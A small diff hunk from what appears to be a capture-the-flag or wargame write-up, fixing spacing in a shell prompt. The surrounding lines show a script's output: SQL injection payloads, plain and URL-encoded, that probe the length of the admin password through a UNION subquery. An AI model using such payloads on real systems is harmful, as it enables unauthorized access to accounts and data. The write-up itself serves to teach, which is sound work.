@@ -174,7 +174,7 @@ print(f"[!] Final payload: ?pw={password}")
 ```
 
 ```
-$python .\dark_eyes_script.py
+$ python .\dark_eyes_script.py
 
 [!] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=8) -- -
 [!] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+length%28pw%29%3D8%29+--+-
